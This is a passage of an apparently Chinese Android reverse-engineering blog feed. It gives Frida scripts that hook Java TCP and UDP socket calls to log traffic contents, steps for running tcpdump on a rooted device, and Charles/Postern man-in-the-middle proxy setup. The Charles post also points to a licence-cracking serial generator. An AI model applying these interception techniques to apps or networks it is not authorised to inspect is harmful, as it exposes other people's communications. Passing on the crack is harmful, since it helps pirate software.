</span></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;\naddress:&quot;</span> + address + <span class="string">&quot;,port&quot;</span> + port + <span class="string">&quot;\n&quot;</span> + <span class="built_in">JSON</span>.stringify(<span class="built_in">this</span>.socket.value) + <span class="string">&quot;\n[&quot;</span> + Process.getCurrentThreadId() + <span class="string">&quot;]receive:&quot;</span> + content);</span><br><span class="line">            printJavaStack(<span class="string">&#x27;socketRead0&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> size;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> SocketOutPutStreamClass = Java.use(<span class="string">&#x27;java.net.SocketOutputStream&#x27;</span>);</span><br><span class="line">        SocketOutPutStreamClass.socketWrite0.implementation = <span class="function"><span class="keyword">function</span> (<span class="params">arg0, arg1, arg2, arg3</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="built_in">this</span>.socketWrite0(arg0, arg1, arg2, arg3);</span><br><span class="line">            <span class="comment">//console.log(&quot;[&quot; + Process.getCurrentThreadId() + &quot;]socketWrite0:len:&quot; + arg3 + &quot;--content:&quot; + JSON.stringify(arg1));</span></span><br><span class="line">            <span class="keyword">var</span> bytearray = Java.array(<span class="string">&#x27;byte&#x27;</span>, arg1);</span><br><span class="line">            <span class="keyword">var</span> content = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arg3; i++) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (isprintable(bytearray[i])) &#123;</span><br><span class="line">                    content = content + <span class="built_in">String</span>.fromCharCode(bytearray[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> socketimpl = <span class="built_in">this</span>.impl.value;</span><br><span class="line">            <span class="keyword">var</span> address = socketimpl.address.value;</span><br><span class="line">            <span class="keyword">var</span> port = socketimpl.port.value;</span><br><span class="line"><span class="comment">//ip、port、内容 </span></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;send address:&quot;</span> + address + <span class="string">&quot;,port&quot;</span> + port + <span class="string">&quot;[&quot;</span> + Process.getCurrentThreadId() + <span class="string">&quot;]send:&quot;</span> + content);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;\n&quot;</span> + <span class="built_in">JSON</span>.stringify(<span class="built_in">this</span>.socket.value) + <span class="string">&quot;\n[&quot;</span> + Process.getCurrentThreadId() + <span class="string">&quot;]send:&quot;</span> + content);</span><br><span class="line">            printJavaStack(<span class="string">&#x27;socketWrite0&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    hooktcp();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setImmediate(main)</span><br></pre></td></tr></table></figure><p>打印出了ip、port、传输内容等信息</p><p><img src="https://i.loli.net/2021/11/04/E8vLb3cz7k1VDq5.png" alt="Untitled"></p><h1 id="hook-Java层udp-socket接口"><a href="#hook-Java层udp-socket接口" class="headerlink" title="hook Java层udp socket接口"></a>hook Java层udp socket接口</h1><p>udp服务端</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">s.bind((<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">8888</span>))</span><br><span class="line">print(<span class="string">&quot;UDP bound on port 8888...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    data, addr = s.recvfrom(<span class="number">1024</span>)</span><br><span class="line">    print(<span class="string">&quot;Receive from %s:%s&quot;</span> %(data,addr))</span><br><span class="line">    <span class="keyword">if</span> data == <span class="string">b&quot;exit&quot;</span>:</span><br><span class="line">        s.sendto(<span class="string">b&quot;Good bye!\n&quot;</span>, addr)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    response=<span class="built_in">str</span>(data)+<span class="string">&quot; received from udpserver&quot;</span></span><br><span class="line">    s.sendto(response.encode(<span class="string">&quot;utf-8&quot;</span>), addr)</span><br></pre></td></tr></table></figure><p>udp客户端</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.myapplication;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.DatagramPacket;</span><br><span class="line"><span class="keyword">import</span> java.net.DatagramSocket;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.SocketException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UdpClient</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> DEST_PORT = <span class="number">8888</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String DEST_IP = <span class="string">&quot;192.168.2.104&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> DATA_LEN = <span class="number">4096</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] inBuff = <span class="keyword">new</span> <span class="keyword">byte</span>[DATA_LEN];</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> DatagramSocket socket;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            socket = <span class="keyword">new</span> DatagramSocket();</span><br><span class="line">            receivethread();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SocketException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> DatagramPacket inPacket = <span class="keyword">new</span> DatagramPacket(inBuff, inBuff.length);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> DatagramPacket outPacket = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">udpsend</span><span class="params">(String content)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            outPacket = <span class="keyword">new</span> DatagramPacket(<span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">0</span>], <span class="number">0</span>, InetAddress.getByName(DEST_IP), DEST_PORT);</span><br><span class="line">            <span class="keyword">byte</span>[] buff = content.getBytes();</span><br><span class="line">            outPacket.setData(buff);</span><br><span class="line">            socket.send(outPacket);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">receivethread</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        socket.receive(inPacket);</span><br><span class="line">                        Log.i(<span class="string">&quot;udpreceive&quot;</span>, <span class="keyword">new</span> String(inBuff, <span class="number">0</span>, inPacket.getLength()));</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Thread.currentThread().sleep(<span class="number">1000</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                    udpsend(<span class="string">&quot;i am from udpclient!&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>AndroidManifest.xml中添加网络权限 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;uses-permission android:name=<span class="string">&quot;android.permission.INTERNET&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>MainActivity中调用 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UdpClient.start();</span><br></pre></td></tr></table></figure><p>hook脚本</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">LogPrint</span>(<span class="params">log</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> theDate = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">    <span class="keyword">var</span> hour = theDate.getHours();</span><br><span class="line">    <span class="keyword">var</span> minute = theDate.getMinutes();</span><br><span class="line">    <span class="keyword">var</span> second = theDate.getSeconds();</span><br><span class="line">    <span class="keyword">var</span> mSecond = theDate.getMilliseconds();</span><br><span class="line"></span><br><span class="line">    hour &lt; <span class="number">10</span> ? hour = <span class="string">&quot;0&quot;</span> + hour : hour;</span><br><span class="line">    minute &lt; <span class="number">10</span> ? minute = <span class="string">&quot;0&quot;</span> + minute : minute;</span><br><span class="line">    second &lt; <span class="number">10</span> ? second = <span class="string">&quot;0&quot;</span> + second : second;</span><br><span class="line">    mSecond &lt; <span class="number">10</span> ? mSecond = <span class="string">&quot;00&quot;</span> + mSecond : mSecond &lt; <span class="number">100</span> ? mSecond = <span class="string">&quot;0&quot;</span> + mSecond : mSecond;</span><br><span class="line">    <span class="keyword">var</span> time = hour + <span class="string">&quot;:&quot;</span> + minute + <span class="string">&quot;:&quot;</span> + second + <span class="string">&quot;:&quot;</span> + mSecond;</span><br><span class="line">    <span class="keyword">var</span> threadid = Process.getCurrentThreadId();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[&quot;</span> + time + <span class="string">&quot;]&quot;</span> + <span class="string">&quot;-&gt;threadid:&quot;</span> + threadid + <span class="string">&quot;--&quot;</span> + log);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printJavaStack</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> Exception = Java.use(<span class="string">&quot;java.lang.Exception&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> ins = Exception.$new(<span class="string">&quot;Exception&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> straces = ins.getStackTrace();</span><br><span class="line">        <span class="keyword">if</span> (straces != <span class="literal">undefined</span> &amp;&amp; straces != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> strace = straces.toString();</span><br><span class="line">            <span class="keyword">var</span> replaceStr = strace.replace(<span class="regexp">/,/g</span>, <span class="string">&quot; \n &quot;</span>);</span><br><span class="line">            LogPrint(<span class="string">&quot;=============================&quot;</span> + name + <span class="string">&quot; Stack strat=======================&quot;</span>);</span><br><span class="line">            LogPrint(replaceStr);</span><br><span class="line">            LogPrint(<span class="string">&quot;=============================&quot;</span> + name + <span class="string">&quot; Stack end======================= \n &quot;</span>);</span><br><span class="line">            Exception.$dispose();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isprintable</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (value &gt;= <span class="number">32</span> &amp;&amp; value &lt;= <span class="number">126</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hookudp</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> LinuxClass = Java.use(<span class="string">&#x27;libcore.io.Linux&#x27;</span>);</span><br><span class="line">        <span class="comment">//private native int recvfromBytes(FileDescriptor fd, Object buffer, int byteOffset, int byteCount, int flags, InetSocketAddress srcAddress) throws ErrnoException, SocketException;</span></span><br><span class="line">        LinuxClass.recvfromBytes.implementation = <span class="function"><span class="keyword">function</span> (<span class="params">arg0, arg1, arg2, arg3, arg4, arg5</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> size = <span class="built_in">this</span>.recvfromBytes(arg0, arg1, arg2, arg3, arg4, arg5);</span><br><span class="line">            <span class="keyword">var</span> bytearray = Java.array(<span class="string">&#x27;byte&#x27;</span>, arg1);</span><br><span class="line">            <span class="keyword">var</span> content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (isprintable(bytearray[i])) &#123;</span><br><span class="line">                    content = content + <span class="built_in">String</span>.fromCharCode(bytearray[i]);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;address:&quot;</span> + arg5 + <span class="string">&quot; [&quot;</span> + Process.getCurrentThreadId() + <span class="string">&quot;]recvfromBytes:size:&quot;</span> + size + <span class="string">&quot;,content:&quot;</span> + <span class="built_in">JSON</span>.stringify(arg1) + <span class="string">&quot;---content,&quot;</span> + content);</span><br><span class="line">            printJavaStack(<span class="string">&#x27;recvfromBytes&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> size;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//private native int sendtoBytes(FileDescriptor fd, Object buffer, int byteOffset, int byteCount, int flags, InetAddress inetAddress, int port) throws ErrnoException, SocketException;</span></span><br><span class="line">        <span class="comment">// private native int sendtoBytes(FileDescriptor fd, Object buffer, int byteOffset, int byteCount, int flags, SocketAddress address) throws ErrnoException, SocketException;</span></span><br><span class="line">        LinuxClass.sendtoBytes.overload(<span class="string">&#x27;java.io.FileDescriptor&#x27;</span>, <span class="string">&#x27;java.lang.Object&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;java.net.InetAddress&#x27;</span>, <span class="string">&#x27;int&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">arg0, arg1, arg2, arg3, arg4, arg5, arg6</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> size = <span class="built_in">this</span>.sendtoBytes(arg0, arg1, arg2, arg3, arg4, arg5, arg6);</span><br><span class="line">            <span class="keyword">var</span> bytearray = Java.array(<span class="string">&#x27;byte&#x27;</span>, arg1);</span><br><span class="line">            <span class="keyword">var</span> content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (isprintable(bytearray[i])) &#123;</span><br><span class="line">                    content = content + <span class="built_in">String</span>.fromCharCode(bytearray[i]);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;address:&quot;</span> + arg5 + <span class="string">&quot;,port&quot;</span> + arg6 + <span class="string">&quot; [&quot;</span> + Process.getCurrentThreadId() + <span class="string">&quot;]LinuxClass11.sendtoBytes:len:&quot;</span> + size + <span class="string">&quot;--content:&quot;</span> + <span class="built_in">JSON</span>.stringify(arg1) + <span class="string">&quot;--content:&quot;</span> + content);</span><br><span class="line">            printJavaStack(<span class="string">&#x27;LinuxClass11.sendtoBytes&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> size;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//sendtoBytes有两个实现，因此都要进行hook</span></span><br><span class="line">        LinuxClass.sendtoBytes.overload(<span class="string">&#x27;java.io.FileDescriptor&#x27;</span>, <span class="string">&#x27;java.lang.Object&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;java.net.SocketAddress&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">arg0, arg1, arg2, arg3, arg4, arg5</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> size = <span class="built_in">this</span>.sendtoBytes(arg0, arg1, arg2, arg3, arg4, arg5);</span><br><span class="line">            <span class="keyword">var</span> bytearray = Java.array(<span class="string">&#x27;byte&#x27;</span>, arg1);</span><br><span class="line">            <span class="keyword">var</span> content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (isprintable(bytearray[i])) &#123;</span><br><span class="line">                    content = content + <span class="built_in">String</span>.fromCharCode(bytearray[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;address:&quot;</span> + arg5 + <span class="string">&quot; [&quot;</span> + Process.getCurrentThreadId() + <span class="string">&quot;]LinuxClass22.sendtoBytes:len:&quot;</span> + size + <span class="string">&quot;--content:&quot;</span> + <span class="built_in">JSON</span>.stringify(arg1) + <span class="string">&quot;,content:&quot;</span> + content);</span><br><span class="line">            printJavaStack(<span class="string">&#x27;LinuxClass22.sendtoBytes&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> size;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    hookudp();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setImmediate(main)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/04/6WdQKn149VRxC3E.png" alt="Untitled"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Java层socket溯源&quot;&gt;&lt;a href=&quot;#Java层socket溯源&quot; class=&quot;headerlink&quot; title=&quot;Java层socket溯源&quot;&gt;&lt;/a&gt;J&lt;strong&gt;ava层socket溯源&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;可以通过AS动态调</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>使用tcpdump抓取Android tcp流量</title>
    <link href="https://tutucoo.github.io/2021/11/04/%E4%BD%BF%E7%94%A8tcpdump%E6%8A%93%E5%8F%96Android%20tcp%E6%B5%81%E9%87%8F/"/>
    <id>https://tutucoo.github.io/2021/11/04/%E4%BD%BF%E7%94%A8tcpdump%E6%8A%93%E5%8F%96Android%20tcp%E6%B5%81%E9%87%8F/</id>
    <published>2021-11-04T09:52:23.000Z</published>
    <updated>2021-11-04T09:52:37.846Z</updated>
    
    <content type="html"><![CDATA[<p>1、下载tcpdump</p><p><a href="https://www.androidtcpdump.com/android-tcpdump/downloads">https://www.androidtcpdump.com/android-tcpdump/downloads</a></p><p>2、tcpdump配置</p><p>要把tcpdump文件放到/system/bin目录下，设备必须root，否则没有权限</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb push tcpdump /data/local/tmp</span><br><span class="line">cat tcpdump /system/bin/tcpdump</span><br></pre></td></tr></table></figure><p>给tcpdump赋值777权限 </p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod <span class="number">777</span> /system/bin/tcpdump</span><br></pre></td></tr></table></figure><p>3、进行tcp通信</p><p><img src="https://i.loli.net/2021/11/04/s9alThXIu7mS3QR.png" alt="Untitled"></p><p>4、进行抓包</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i wlan0 -s <span class="number">0</span> -w /sdcard/<span class="number">1.</span>pcap -v</span><br></pre></td></tr></table></figure><p>ctrl+c可以结束抓包 </p><p>5、导出pcap分析</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb pull /sdcard/<span class="number">1.</span>pcap</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/04/q6zwbuKHOsAQkRv.png" alt="Untitled"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;1、下载tcpdump&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.androidtcpdump.com/android-tcpdump/downloads&quot;&gt;https://www.androidtcpdump.com/android-tcpdump/down</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Android中间人抓包工具使用</title>
    <link href="https://tutucoo.github.io/2021/11/04/Android%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%8A%93%E5%8C%85%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    <id>https://tutucoo.github.io/2021/11/04/Android%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%8A%93%E5%8C%85%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</id>
    <published>2021-11-04T09:41:52.000Z</published>
    <updated>2021-11-04T09:50:50.362Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Android中间人抓包工具使用"><a href="#Android中间人抓包工具使用" class="headerlink" title="Android中间人抓包工具使用"></a>Android中间人抓包工具使用</h1><h2 id="使用Charles进行抓包"><a href="#使用Charles进行抓包" class="headerlink" title="使用Charles进行抓包"></a><strong>使用Charles进行抓包</strong></h2><h3 id="charles破解"><a href="#charles破解" class="headerlink" title="charles破解"></a>charles破解</h3><p>官网下载charles，然后进入破解网站生成序列号直接注册成功</p><p><a href="https://www.zzzmode.com/mytools/charles/">https://www.zzzmode.com/mytools/charles/</a></p><p>1、手机设置代理  </p><p>wifi设置代理，端口8888</p><p>2、charles设置</p><p>Proxy–&gt;SSL Proxying Setting，Enable SSL Proxying打上勾，ip和端口全部*</p><p><img src="https://i.loli.net/2021/11/04/EaJ5v3l4NoP8krO.png" alt="Untitled"></p><p>3、手机安装charles证书</p><p>手机访问 chls.pro/ssl 下载并安装证书</p><h3 id="开启charles外部代理"><a href="#开启charles外部代理" class="headerlink" title="开启charles外部代理"></a>开启charles外部代理</h3><p>External Proxy Settings–&gt;Use external proxy servers打上勾</p><p><img src="https://i.loli.net/2021/11/04/xRlQYLz5ViyA1Bq.png" alt="Untitled"></p><h3 id="配合Postern拦截socks5流量"><a href="#配合Postern拦截socks5流量" class="headerlink" title="配合Postern拦截socks5流量"></a><strong>配合Postern拦截socks5流量</strong></h3><p>1、Charles端设置</p><p>开启socks代理 </p><p><img src="https://i.loli.net/2021/11/04/Qhj9cEoZ6M1HgPG.png" alt="Untitled"></p><p>通过socks可以抓取http额外端口的数据</p><p><img src="https://i.loli.net/2021/11/04/sWlQvMqd96yTijG.png" alt="Untitled"></p><p>2、postern端配置</p><p>配置代理</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">服务器地址：填Charles主机ip</span><br><span class="line"></span><br><span class="line">服务器端口：Charles默认<span 